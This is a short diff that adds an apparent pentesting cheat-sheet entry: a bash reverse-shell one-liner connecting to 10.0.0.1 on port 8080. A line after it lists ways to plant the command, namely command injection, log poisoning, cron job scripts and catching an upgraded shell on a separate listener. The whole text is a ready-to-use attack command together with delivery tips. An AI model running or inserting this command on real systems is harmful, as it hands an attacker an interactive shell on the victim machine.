@@ -1,0 +1,5 @@
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+can enter this in many places. Command injection, log poisoning, once on the system to get a better shell to catch on a seperate listener,
+cronjob bash scripts, etc
+
